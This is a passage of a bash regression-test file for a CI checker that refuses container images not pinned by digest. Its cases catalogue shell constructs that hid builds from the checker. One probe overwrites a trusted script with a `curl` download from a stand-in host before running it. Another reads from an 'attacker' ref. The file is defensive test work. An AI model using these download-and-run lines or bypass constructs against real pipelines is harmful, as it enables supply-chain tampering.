case_ r4b4-cache-from-same-as-output-tag-bad bad "$(rb "docker build --cache-from alpine:3.20 -t alpine:3.20 -f build/docker/Dockerfile.production .")" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\n" > build/docker/Dockerfile.production'
case_ r4b4-cache-from-type-registry-bad bad "$(rb 'docker buildx build --cache-from type=registry,ref=alpine:3.20 -f build/docker/Dockerfile.production .')" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\n" > build/docker/Dockerfile.production'
case_ r4b4-cache-from-gha-ok   ok  "$(rb 'docker build --cache-from type=gha -f build/docker/Dockerfile.production .')" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\n" > build/docker/Dockerfile.production'
# Codex #164 fresh r5, B2: buildx keeps only the LAST repeated type= attribute (comma-separated), same rule as any
# repeated key -- a leading type=local does not exempt a trailing, effective type=registry
case_ r4b4-cache-from-repeated-type-bad bad "$(rb 'docker buildx build --cache-from type=local,type=registry,ref=alpine:latest -f build/docker/Dockerfile.production .')" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\n" > build/docker/Dockerfile.production'
case_ r4b4-cache-from-repeated-type-reverse-ok ok "$(rb 'docker buildx build --cache-from type=registry,ref=alpine@$DIG,type=local -f build/docker/Dockerfile.production .')" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\n" > build/docker/Dockerfile.production'
case_ r4b5-crane-index-append-bad bad "$(rb 'crane index append -m alpine:3.20 -t x/y:z')"
case_ r4b5-crane-index-filter-bad bad "$(rb 'crane index filter alpine:3.20 --platform linux/amd64 -t x/y:z')"
case_ r4b5-crane-index-append-digest-ok ok "$(rb "crane index append -m alpine@$DIG -t x/y:z")"
case_ r4b5-crane-index-append-extra-positional-bad bad "$(rb 'crane index append alpine@$DIG busybox:1.37 --tag x/y:z')"
case_ r4b5-crane-manifest-comma-list-bad bad "$(rb 'crane index append --manifest busybox:1.37,alpine@$DIG --tag x/y:z')"
case_ r4b4-cache-from-comma-list-bad bad "$(rb "docker build --cache-from busybox:1.37,alpine@\$DIG -f build/docker/Dockerfile.production .")" 'mkdir -p build/docker; printf "FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\n" > build/docker/Dockerfile.production'
case_ r4b5-crane-index-list-ok ok  "$(rb 'crane index list x/y:z')"
# Codex #164 fresh r5, B1: a trap body is deferred (runs only on the signal, not in line order) — its build/tag must
# never register a local name an EARLIER, unconditional command can then rely on
case_ r4b1-trap-deferred-local-bad bad "$(rb "trap -- 'docker build -t alpine:latest .' EXIT
          docker run --rm alpine:latest")" 'printf "FROM scratch\n" > Dockerfile'
case_ r4b1-trap-deferred-tag-bad   bad "$(rb "trap 'docker tag alpine@\$DIG alpine:latest' EXIT
          docker run --rm alpine:latest")"
case_ r4b1-trap-build-still-checked-bad bad "$(rb "trap -- 'docker build -t alpine:latest .' EXIT")" 'printf "FROM alpine:latest\n" > Dockerfile'
# Sonnet #164 r7/r8, Codex #164 r9/r10/r11: scoping the exclusion to just the trap's own body -- by line, by
# quote state, however carefully tracked -- kept reopening a new bypass every round: a multi-line body (single
# or double quoted), the embedded-apostrophe idiom, an escaped quote, a close-then-reopen on one line, a
# command substitution, an apostrophe in an EARLIER trap's comment confusing a LATER trap's own body, a quoted
# spelling of the word "trap" itself evading detection. advisor 0080: stop chasing it construct by construct --
# the word "trap" appearing ANYWHERE in the script now denies local-name trust to the WHOLE script, so every
# one of those constructs (and the two below that actually broke the per-line tracking) is "bad" by the same
# simple rule, not by successfully reading each one's quoting correctly.
case_ r4b1-trap-multiline-local-bad bad "$(rb "trap -- '
          docker build -t alpine:latest .
          ' EXIT
          docker run --rm alpine:latest")" 'printf "FROM scratch\n" > Dockerfile'
case_ r4b1-trap-multiline-dquote-local-bad bad "$(rb "trap -- \"
          docker build -t alpine:latest .
          \" EXIT
          docker run --rm alpine:latest")" 'printf "FROM scratch\n" > Dockerfile'
# Codex #164 r11, B1: an apostrophe in an EARLIER trap's trailing comment must not let a LATER trap's own body
# be read as plain, trusted script text -- moot now: "trap" appearing anywhere denies trust to the whole script
case_ r4b1-trap-comment-then-second-trap-bad bad "$(rb "trap -- 'true' USR1 # don't discard later builds
          trap -- '
          docker build -t alpine:latest .
          ' USR2
          docker run --rm alpine:latest")" 'printf "FROM scratch\n" > Dockerfile'
# Codex #164 r9, R1 turned real residual: a trap that only ever runs a harmless cleanup, with no build/tag in
# it at all, still costs the rest of the script its local-name trust under the global rule -- an accepted,
# documented usability cost (advisor 0080), not a bypass; a script with no real use for trap is unaffected.
case_ r4b1-trap-harmless-cleanup-still-bad bad "$(rb "trap -- '
          cleanup
          ' EXIT
          docker build -t alpine:latest .
          docker run --rm alpine:latest")" 'printf "FROM scratch\n" > Dockerfile'


# advisor 0143: a plain `docker run <mutable tag>` step inserted into the REAL, full-size auditor.yml (not a
# synthetic minimal fixture) must still be caught -- root-caused as main never having had run: scanning at all
# (the docstring overclaimed it; this checker adds it for the first time), not a gap in this scanner's current
# logic. This locks the real file in as a permanent regression case, not just the synthetic r()/rb() ones above.
real_repo=$(cd "$here/../../.." && pwd)
realcase="$work/real-auditor-plain-run"
mkdir -p "$realcase/.github/workflows" "$realcase/.github/agent/bin"
cp "$real_repo/.github/workflows/auditor.yml" "$realcase/.github/workflows/auditor.yml"
cp "$gate" "$realcase/.github/workflows/agent-review-gate.yml"
: > "$realcase/.github/agent/bin/auditor-review-gate.py"; : > "$realcase/.github/agent/bin/check-action-pins.py"; mkdir -p "$realcase/bin" "$realcase/.github/agent/tests"; : > "$realcase/bin/check-file-allowlist.sh"; : > "$realcase/.github/agent/tests/pin-wiring-test.sh"
python3 -c "
s = open('$realcase/.github/workflows/auditor.yml').read()
marker = '    steps:\n'
i = s.index(marker) + len(marker)
s = s[:i] + '      - run: docker run --rm alpine:latest\n' + s[i:]
open('$realcase/.github/workflows/auditor.yml', 'w').write(s)
"
out=$(python3 "$here/../bin/check-action-pins.py" "$realcase" 2>&1 || true)
if echo "$out" | grep -q "docker run\` names an image not pinned by digest: 'alpine:latest'"; then
  pass=$((pass+1)); echo "PASS real-auditor-plain-run-bad → bad"
else
  failn=$((failn+1)); echo "FAIL real-auditor-plain-run-bad → ok (want bad)"
fi

# Codex #164 r11/r12: an ordinary bash array-append (arr+=(...), building a flag list -- release.yml's own
# base_arg+=(--base-grype "$f")) was read element by element as a separate command the moment one element
# contained a $variable, because a tokenizer with no notion of bash arrays can't tell the array's own parens
# from a literal one inside a quoted element once quotes are stripped. The array literal is now simply inert.
case_ r4b6-array-append-var-element-ok ok "$(rb 'base_arg+=(--base-grype "$f")')"
# the same, as the real repo's trigger looked: an if/then branch, not a standalone statement
case_ r4b6-array-append-in-if-ok ok "$head
    steps:
      - run: |
          if true; then base_arg+=(--base-grype \"\$f\"); fi"
# Codex #164 r12, B2 (adversarial, not a plain form -- advisor 0117): a literal quoted \"(\" or \")\" as an
# array ELEMENT (not the array's own structural paren) can no longer throw off a closing-paren count, because
# there is no longer a count at all -- the whole literal is inert either way
case_ r4b6-array-element-is-a-paren-ok ok "$(rb 'a=(")" "$f")')"
# a REAL command after the array literal closes, on a SEPARATE statement (the common, plain form), is still
# fully checked -- the array literal does not swallow anything beyond its own statement
case_ r4b6-array-then-separate-run-bad bad "$(rb 'arr=(a b c)
          docker run --rm alpine:latest')"
# Codex #164 r12 (the actual regression this round caught): a '#' COMMENT inside a multi-line array literal
# -- an ordinary, common idiom (this repo's own bin/check-file-allowlist.sh has one) -- can contain an
# apostrophe ("product's") that any quote-aware scanner misreads as opening a real quote, corrupting
# everything scanned after it. The array literal is inert without needing to parse comments at all.
case_ r4b6-array-comment-apostrophe-ok ok "$(rb 'ALLOW_PATTERNS=(
          # a comment with an apostrophe, like product'"'"'s files
          "a-regular-element"
          )
          echo done')"
# accepted residual (advisor 0080/0117, documented in _skip_array_literal): a REAL command on the SAME
# statement as the array literal, after it closes (a genuine but rare bash idiom -- not seen plain anywhere
# in this repo), is not checked either. Not a blocker; pinned so this stays a deliberate, known trade-off.
case_ r4b6-array-then-same-line-run-accepted-residual ok "$(rb 'a=(x) docker run --rm alpine:latest')"
# Codex #164 r13, B1: a MULTI-LINE array literal's content reaches _commands()'s shared chunk-splitter
# unprotected -- a '#' comment line inside it containing a bare ')' ends the "array" chunk right there,
# spilling the deferred docker tag out as its own top-level, wrongly-trusted statement
case_ r4b6-multiline-array-comment-paren-spills-tag-bad bad "$(rb 'arr=(
          # )
          docker tag alpine@$DIG alpine:latest
          )
          docker run alpine:latest')"
# Codex #164 r13, B1 (second form): a comment containing an apostrophe can instead make the splitter MERGE
# the array with a real command AFTER it into one chunk, swallowing that real command as array data
case_ r4b6-multiline-array-comment-apostrophe-swallows-run-bad bad "$(rb "arr=(
          # product's files
          x
          ); docker run alpine:latest")"
# Sonnet #164 r14, B1: the classic 'x'\''y' idiom (closing a single quote, escaping a literal apostrophe,
# reopening) embeds a literal apostrophe without opening a new quote -- a scanner with no backslash-escape
# handling outside quotes (unlike the outer _split_commands loop) mistakes each of the three remaining
# apostrophes for independent open/close toggles, ending up still "inside a quote" and swallowing everything
# through end of script, including a REAL command on a wholly separate, later statement
case_ r4b6-array-escaped-apostrophe-idiom-swallows-run-bad bad "$(rb "arr=('a'\\''b' c)
          docker run --rm alpine:latest")"
# Codex #164 r14, B2: _cut_substitutions() (which runs BEFORE the array sub-scanner) only recognized a '#'
# comment when preceded by whitespace/;/newline -- not '(' -- so a comment right after an array's own opening
# paren was read as real text, its apostrophe treated as a quote-open that then swallowed a REAL $(...)
# substitution immediately after it, missing the command inside
case_ r4b6-array-comment-right-after-paren-hides-subst-bad bad "$(rb "arr=(# product's files
          \$(docker run --rm alpine:latest)
          )")"
# Codex #164 r14, B2 (false-positive form): the same comment-boundary gap meant a \$(...) that only EVER
# appears inside a comment (never real code) was wrongly read as a live substitution
case_ r4b6-array-comment-only-subst-ok ok "$(rb "arr=(# \$(docker run --rm alpine:latest)
          x
          )")"
# Codex #164 r14, B3: _unconditional()'s own if/case/trap keyword regex has no comment-awareness at all, so a
# comment reading literally "# if" / "# fi" was read as real control-flow, corrupting the if/case tracking
# stack and letting an array's inert tag content leak into the trusted, unconditional set
case_ r4b6-unconditional-keyword-in-comment-bad bad "$(rb "arr=( # if
          # fi
          docker tag alpine@\$DIG alpine:latest
          )
          if false; then docker tag alpine@\$DIG alpine:latest; fi
          docker run alpine:latest")"
# Codex #164 r15, B1/B2: any array literal anywhere now denies trust to the WHOLE script (same posture as
# trap) -- not just when a comment is involved. _unconditional()'s own if/case keyword regex has no quote OR
# comment awareness at all (quoted array DATA like "# if" is just as exploitable as a real comment was), and
# teaching it every construct one at a time is the same trap the trap rule already walked away from once; no
# real workflow in this repo combines an array with a local-build-then-run pattern (confirmed by direct grep)
case_ r4b6-array-with-quoted-keyword-data-bad bad "$(rb "arr=(\"# if\"
          \"# fi\"
          docker build -t alpine:latest .
          )
          if false; then docker build -t alpine:latest .; fi
          docker run alpine:latest")" 'printf "FROM scratch\n" > Dockerfile'
# Codex #164 r15, B3: the NESTED \$(...) substitution scanner (used when a command substitution recurses into
# another one) is a SEPARATE scanner from the top-level one, and had never learned the comment rule either --
# a comment with an unbalanced ')' AND the escaped-apostrophe idiom together closed the substitution early,
# leaving the real docker run inside what looked like unextracted array data
case_ r4b6-nested-subst-comment-paren-apostrophe-bad bad "$(rb "arr=(\$( # ) 'x'\\''y'
          docker run --rm alpine:latest
          ))")"
# Codex #164 r15, B5 (regression from r14's own B2 fix): an ESCAPED paren (\\() immediately followed by '#' is
# not a real '(' starting a new word -- it's data inside an array element -- so the '#' right after it is NOT
# a comment, and a REAL \$(...) substitution right after that must still be read
case_ r4b6-escaped-paren-before-hash-not-a-comment-bad bad "$(rb 'arr=(\(#$(docker run --rm alpine:latest)))')"
# Codex #164 r16, B3: the same escape-awareness is needed for every comment-boundary character, not just
# '(' -- an escaped space or escaped semicolon right before '#' is also data inside the current word, not a
# real boundary, so the '#' after it is not a comment either
case_ r4b6-escaped-space-before-hash-not-a-comment-bad bad "$(rb 'arr=(\ #$(docker run --rm alpine:latest))')"
case_ r4b6-escaped-semicolon-before-hash-not-a-comment-bad bad "$(rb 'arr=(\;#$(docker run --rm alpine:latest))')"
# Codex #164 r16, B1: _expand_names() (a SEPARATE trust mechanism from _unconditional(), scanning job-wide
# text for a "for VAR in ...; do ... done" loop whose body builds the same template a tag command uses) can't
# tell a REAL loop from one planted purely as quoted, never-executed array DATA in an EARLIER, unrelated step
case_ r4b6-expand-names-fake-loop-in-array-bad bad "$head
    steps:
      - run: |
          arr=('for v in latest; do alpine:\${v}; done')
      - run: |
          read -r v <<< safe
          docker pull alpine@\$DIG
          docker tag alpine@\$DIG \"alpine:\${v}\"
          docker run alpine:latest"
# Sonnet #164 r16, B1: an ORDINARY, non-adversarial quoted scalar containing one of the if/case/trap keyword
# words as plain data (no array, no comment -- just a log message or variable) corrupted _unconditional()'s
# if/case tracking the same way a comment did, because the keyword regex has no quote-awareness at all
case_ r4b6-quoted-scalar-contains-keyword-word-bad bad "$(rb 'if [ "$x" = y ]; then
          PROFILE="release notes fi"
          docker build -t alpine:latest .
          fi
          docker run alpine:latest')" 'printf "FROM scratch\n" > Dockerfile'
# the same quoted-keyword-word text must NOT disturb a genuinely safe script's own trust computation --
# proven against the real repo's existing dynamic-tag-name forms (n13/n21), which quote a $variable template
# as the tag target and must keep working

# --- r17 (Codex 11 blockers, Sonnet 2), PLAIN forms only (owner 0117: plain forms are in scope, deliberately hidden ones are
# information). Each probe hides a build/tag behind an ordinary shell idiom; the checker must still refuse the unpinned run.
DF='printf "FROM scratch\n" > Dockerfile'
# Sonnet r17 B2 / Codex r17 B01: a quoted string that spans lines carries a keyword-looking word on its second line
case_ r17-multiline-quote-hides-fi-bad bad "$(rb 'if false; then
          PROFILE="release notes
          fi
          then"
          docker build -t alpine:latest .
          fi
          docker run alpine:latest')" "$DF"
# Codex r17 B02: an ordinary unquoted ARGUMENT spelled like a keyword
case_ r17-keyword-as-argument-bad bad "$(rb 'if false; then
          printf "%s\n" fi
          docker build -t alpine:latest .
          fi
          docker run alpine:latest')" "$DF"
# Sonnet r17 B1 / Codex r17 B03: loop text sitting inert in a comment or a quoted scalar must not prove a template
case_ r17-loop-in-comment-bad bad "$(rb '# for v in latest; do docker build -t "alpine:${v}" .; done
          docker build -t "alpine:${v}" .
          docker run alpine:latest')" "$DF"
case_ r17-loop-in-scalar-bad bad "$(rb "NOTE='for v in latest; do docker build -t \"alpine:\${v}\" .; done'
          docker build -t \"alpine:\${v}\" .
          docker run alpine:latest")" "$DF"
# Codex r17 B05: a command after a line that ends in && or || is conditional too
case_ r17-and-then-newline-bad bad "$(rb 'false &&
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r17-or-then-newline-bad bad "$(rb 'true ||
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
# Codex r17 B07: `for v; do` iterates over the (possibly empty) positional parameters
case_ r17-for-without-in-bad bad "$(rb 'for v; do
            docker build -t alpine:latest .
          done
          docker run alpine:latest')" "$DF"
# Codex r17 B09: a # inside a word is not a comment, so the command after it is still a command (fail-OPEN before)
case_ r17-hash-inside-word-bad bad "$(rb 'NOTE=hello#world docker run alpine:latest')"
case_ r17-hash-inside-word-arg-bad bad "$(rb 'echo a#b; docker run alpine:latest')"
# controls: the same idioms, used innocently, must NOT disturb a genuinely safe script
case_ r22-failclosed-closed-multiline-quote-bad bad "$(rb 'MSG="hello
          world"
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r17-control-hash-in-word-then-build-localtrust-removed-bad bad "$(rb 'echo hello#world
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r17-control-real-loop-localtrust-removed-bad bad "$(rb 'for v in latest; do docker build -t "alpine:${v}" .; done
          docker run alpine:latest')" "$DF"
case_ r17-control-keyword-in-comment-localtrust-removed-bad bad "$(rb 'docker build -t alpine:latest . # fi then done
          docker run alpine:latest')" "$DF"

# --- r18 (Sonnet 2 blockers, plain forms): a multi-line conditional group, and a loop whose list can be empty
# Sonnet r18 B1: `cond && {` / `cond || {` / `cond && (` opens a MULTI-LINE group that may never run
case_ r18-and-brace-block-bad bad "$(rb '[ -n "$X" ] && {
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
case_ r18-or-brace-block-bad bad "$(rb '[ -z "$X" ] || {
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
case_ r18-and-subshell-block-bad bad "$(rb 'test -n "$X" && (
            docker build -t alpine:latest .
          )
          docker run alpine:latest')" "$DF"
case_ r18-nested-group-in-conditional-bad bad "$(rb '[ -n "$X" ] && {
            { true; }
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
# Sonnet r18 B2: a for-list that is not a non-empty literal word list may run zero times
case_ r18-for-positional-bad bad "$(rb 'for v in "$@"; do
            docker build -t alpine:latest .
          done
          docker run alpine:latest')" "$DF"
case_ r18-for-variable-list-bad bad "$(rb 'for v in $LIST; do docker build -t alpine:latest .; done
          docker run alpine:latest')" "$DF"
case_ r18-for-glob-bad bad "$(rb 'for f in ./nonexistent/*; do docker build -t alpine:latest .; done
          docker run alpine:latest')" "$DF"
case_ r18-for-substitution-bad bad "$(rb 'for f in $(ls nothing); do docker build -t alpine:latest .; done
          docker run alpine:latest')" "$DF"
case_ r18-for-c-style-bad bad "$(rb 'for ((i=0;i<N;i++)); do docker build -t alpine:latest .; done
          docker run alpine:latest')" "$DF"
# Sonnet r18 R1: a case pattern spelled like a keyword must not pop the tracking stack
case_ r18-case-pattern-spelled-done-bad bad "$(rb 'case "$X" in
            done) docker build -t alpine:latest . ;;
          esac
          docker run alpine:latest')" "$DF"
# controls: the same shapes, harmless, must NOT disturb a genuinely safe script
case_ r19-failclosed-unconditional-brace-group-bad bad "$(rb '{
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
case_ r18-control-literal-for-list-localtrust-removed-bad bad "$(rb 'for v in latest; do docker build -t "alpine:${v}" .; done
          docker run alpine:latest')" "$DF"
case_ r19-failclosed-group-after-and-bad bad "$(rb 'docker build -t alpine:latest .
          [ -n "$X" ] && {
            echo hello
          }
          docker run alpine:latest')" "$DF"

# --- r19 (Codex 12 blockers, Sonnet 1): the straight-line gate. Local-build trust is granted only to a script of simple commands,
# && / || chains, pipelines and literal for-loops; every probe below hides a build behind a compound construct, so none grants trust
# (each refused for the intended reason: the unpinned `docker run`). Controls after them must keep passing.
case_ r19-b01-and-newline-brace-bad bad "$(rb 'false &&
          {
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
case_ r19-b01-and-brace-same-line-bad bad "$(rb 'false && { echo building
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
case_ r19-b01-and-for-bad bad "$(rb 'false && for v in latest; do
            docker build -t alpine:latest .
          done
          docker run alpine:latest')" "$DF"
case_ r19-b02-case-alternative-pattern-bad bad "$(rb 'case pending in
            done|finished) docker build -t alpine:latest . ;;
          esac
          docker run alpine:latest')" "$DF"
case_ r19-b03-bang-if-bad bad "$(rb '! if false; then
            docker build -t alpine:latest .
          fi
          docker run alpine:latest')" "$DF"
case_ r19-b03-time-if-bad bad "$(rb 'time if false; then
            docker build -t alpine:latest .
          fi
          docker run alpine:latest')" "$DF"
case_ r19-b04-loop-list-comment-bad bad "$(rb 'for v in debug # latest is built separately
          do
            docker build -t "alpine:$v" .
          done
          docker run alpine:latest')" "$DF"
case_ r19-b05-positional-loop-bad bad "$(rb 'set --
          for v; do echo "Building ${v}"
            docker build -t alpine:latest .
          done
          docker run alpine:latest')" "$DF"
case_ r19-b05-uncalled-function-bad bad "$(rb 'build_image() { echo "Building ${1}"
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
case_ r19-b06-empty-list-with-comment-bad bad "$(rb 'for v in # nothing selected
          do
            docker build -t alpine:latest .
          done
          docker run alpine:latest')" "$DF"
case_ r19-b07-loop-continue-bad bad "$(rb 'for v in latest; do
            [ -f missing-build-input ] || continue
            docker build -t alpine:latest .
          done
          docker run alpine:latest')" "$DF"
case_ r19-b07-loop-break-bad bad "$(rb 'for v in a b; do
            break
            docker build -t alpine:latest .
          done
          docker run alpine:latest')" "$DF"
case_ r19-b08-bash-c-conditional-bad bad "$(rb "bash -c 'if false; then docker build -t alpine:latest .; fi'
          docker run alpine:latest")" "$DF"
case_ r19-b08-eval-conditional-bad bad "$(rb "eval 'if false; then docker build -t alpine:latest .; fi'
          docker run alpine:latest")" "$DF"
case_ r19-b09-function-after-command-bad bad "$(rb 'echo "Preparing build"; build_image() {
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
case_ r19-b10-case-in-substitution-bad bad "$(rb 'id="$(case x in x) docker run -d alpine:latest ;; esac)"
          printf "%s\n" "$id"')"
case_ r19-b11-background-build-bad bad "$(rb 'docker build -t alpine:latest . &
          docker run alpine:latest
          wait')" "$DF"
case_ r19-b12-later-build-same-name-bad bad "$(rb 'if false; then
            docker build -t alpine:latest .
          fi
          docker run alpine:latest
          docker build -t alpine:latest .')" "$DF"
# Sonnet r19 B1 / R1: a keyword after ${...} or $(...) is an ordinary word; a conditional group opener on the next line
case_ r19-s1-keyword-after-expansion-bad bad "$(rb 'if [ -f x ]; then
            echo building ${NAME} done
            docker build -t alpine:latest .
          fi
          docker run alpine:latest')" "$DF"
case_ r19-s1-keyword-after-substitution-bad bad "$(rb 'if [ -f x ]; then
            echo built at $(date) done
            docker build -t alpine:latest .
          fi
          docker run alpine:latest')" "$DF"
case_ r19-s-r1-opener-on-next-line-bad bad "$(rb '[ -f x ] &&
          {
            docker build -t alpine:latest .
          }
          docker run alpine:latest')" "$DF"
# controls that MUST keep passing: straight-line scripts, chains, pipelines, literal loops, expansions, comments, closed quotes
case_ r19-control-straight-line-localtrust-removed-bad bad "$(rb 'docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r19-failclosed-build-and-run-chain-bad bad "$(rb 'docker build -t alpine:latest . && docker run alpine:latest')" "$DF"
case_ r19-failclosed-build-piped-bad bad "$(rb 'docker build -t alpine:latest . | cat
          docker run alpine:latest')" "$DF"
case_ r19-control-expansion-and-redirect-localtrust-removed-bad bad "$(rb 'echo "built ${NAME:-x} at $(date)" >log 2>&1
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r19-control-multiple-literal-loop-localtrust-removed-bad bad "$(rb 'for v in a b c; do
            docker build -t "alpine:${v}" .
          done
          docker run alpine:b')" "$DF"

# --- r20 (Sonnet B2): main's own stage-admission.yml writes main's copy of a committed script to /tmp/policy in ONE step and runs it in
# ANOTHER (#163's design). A /tmp copy that a step of the job writes ONCE from `git show origin/main:<committed file>` resolves to that
# committed file, exactly like the $RUNNER_TEMP copy; every other shape stays refused.
mkdir_bin='mkdir -p bin && printf "#!/usr/bin/env bash\necho hi\n" > bin/tool.sh && printf "print(1)\n" > bin/tool.py'
case_ r20-tmp-copy-bash-ok ok "$head
    steps:
      - run: |
          mkdir -p /tmp/policy
          git show origin/main:bin/tool.sh > /tmp/policy/tool.sh
      - run: bash /tmp/policy/tool.sh" "$mkdir_bin"
case_ r20-tmp-copy-python-ok ok "$head
    steps:
      - run: |
          mkdir -p /tmp/policy
          git show origin/main:bin/tool.py > /tmp/policy/tool.py
      - run: python3 /tmp/policy/tool.py" "$mkdir_bin"
case_ r20-tmp-copy-from-other-ref-bad bad "$head
    steps:
      - run: |
          git show attacker:bin/tool.sh > /tmp/policy/tool.sh
      - run: bash /tmp/policy/tool.sh" "$mkdir_bin"
case_ r20-tmp-copy-never-written-bad bad "$head
    steps:
      - run: bash /tmp/policy/tool.sh" "$mkdir_bin"
case_ r20-tmp-copy-written-twice-bad bad "$head
    steps:
      - run: |
          git show origin/main:bin/tool.sh > /tmp/policy/tool.sh
          curl -sSf https://example.invalid/x > /tmp/policy/tool.sh
      - run: bash /tmp/policy/tool.sh" "$mkdir_bin"
case_ r20-tmp-copy-not-a-committed-file-bad bad "$head
    steps:
      - run: |
          git show origin/main:bin/missing.sh > /tmp/policy/missing.sh
      - run: bash /tmp/policy/missing.sh" "$mkdir_bin"
case_ r20-tmp-copy-name-mismatch-bad bad "$head
    steps:
      - run: |
          git show origin/main:bin/tool.sh > /tmp/policy/other.sh
      - run: bash /tmp/policy/other.sh" "$mkdir_bin"
# --- r20 (Sonnet B1): a pipeline continued across lines inside an && / || chain is conditional too
case_ r20-and-pipeline-continued-bad bad "$(rb 'false && echo x |
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-and-newline-pipeline-continued-bad bad "$(rb 'false &&
          echo x |
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-or-pipeline-continued-bad bad "$(rb 'true ||
          echo x |
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-failclosed-continued-pipeline-bad bad "$(rb 'docker build -t alpine:latest . |
          cat
          docker run alpine:latest')" "$DF"

# --- r20 (Codex 10 blockers): the bookkeeping around local trust, closed fail-closed in the gate. Every probe below makes the tag NOT
# certainly present when the later `docker run` pulls it, so none may grant trust; controls after them must keep passing.
case_ r20-b01-later-build-same-name-bad bad "$(rb 'false && docker build -t alpine:latest .
          docker run alpine:latest
          docker build -t alpine:latest .')" "$DF"
case_ r20-b02-or-recovery-bad bad "$(rb 'docker build -t alpine:latest . < /__missing_input__ || docker run alpine:latest')" "$DF"
case_ r20-b02-or-true-bad bad "$(rb 'docker build -t alpine:latest . || true
          docker run alpine:latest')" "$DF"
case_ r20-b03-pipeline-concurrent-bad bad "$(rb 'docker build -t alpine:latest . | docker run --rm -i alpine:latest cat')" "$DF"
case_ r20-b05-loop-uses-future-name-bad bad "$(rb 'for v in 3.20 latest; do
            docker build -t "alpine:${v}" .
            docker run --rm alpine:latest
          done')" "$DF"
case_ r20-b06-printf-v-rewrites-loop-var-bad bad "$(rb 'for v in latest; do
            printf -v v %s debug
            docker build -t "alpine:${v}" .
          done
          docker run alpine:latest')" "$DF"
case_ r20-b06-read-rewrites-loop-var-bad bad "$(rb 'for v in latest; do
            read -r v < versions.txt
            docker build -t "alpine:${v}" .
          done
          docker run alpine:latest')" "$DF"
case_ r20-b07-substitution-order-bad bad "$(rb 'docker build -t alpine:latest .
          echo "$(docker rmi alpine:latest)"
          docker run alpine:latest')" "$DF"
case_ r20-b08-xargs-wrapper-bad bad "$(rb "printf '' | xargs -r docker build -t alpine:latest .
          docker run alpine:latest")" "$DF"
case_ r20-b08-env-printf-words-bad bad "$(rb 'env printf "%s\n" docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-b08-echo-words-bad bad "$(rb 'echo docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-b09-local-exporter-bad bad "$(rb 'docker buildx build --output=type=local,dest=/tmp/out -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-b09-short-output-bad bad "$(rb 'docker build -o /tmp/out -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-b09-buildx-without-load-bad bad "$(rb 'docker buildx build -t alpine:latest .
          docker run alpine:latest')" "$DF"
# controls that must keep passing
case_ r20-control-sudo-docker-build-localtrust-removed-bad bad "$(rb 'sudo docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-control-buildx-load-localtrust-removed-bad bad "$(rb 'docker buildx build --load -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r20-failclosed-semicolon-and-chain-bad bad "$(rb 'docker build -t alpine:latest . ; docker run alpine:latest
          docker build -t alpine:b . && docker run alpine:b')" "$DF"
case_ r20-control-loop-then-run-after-localtrust-removed-bad bad "$(rb 'for v in a b; do
            docker build -t "alpine:${v}" .
          done
          docker run alpine:b')" "$DF"

# --- r21 (Sonnet B1): `docker rmi` with a COMPUTED argument removes a local tag the checker cannot name: no local trust survives it
case_ r21-rmi-substitution-arg-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - run: |
          docker rmi \$(docker images -q alpine:latest)
          docker run --rm alpine:latest true" "$DF"
case_ r21-rmi-variable-arg-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - run: |
          IMGS=\$(docker images -q)
          docker rmi -f \$IMGS
          docker run --rm alpine:latest true" "$DF"
case_ r21-image-rm-glob-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - run: |
          docker image rm alpine:*
          docker run --rm alpine:latest true" "$DF"
case_ r21-control-rmi-other-literal-localtrust-removed-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - run: |
          docker rmi unrelated:tag
          docker run --rm alpine:latest true" "$DF"

# --- r21 (Sonnet R2): more builds that never load an image into the daemon
case_ r21-buildx-b-alias-bad bad "$(rb 'docker buildx b -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r21-attached-output-type-bad bad "$(rb 'docker build -otype=tar,dest=/tmp/o.tar -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r21-push-bad bad "$(rb 'docker build --push -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r21-check-only-bad bad "$(rb 'docker build --check -t alpine:latest .
          docker run alpine:latest')" "$DF"

# --- r21 (Codex 10 blockers): local trust must rest on a build that SUCCEEDED, in the RIGHT store, under an intact name and script
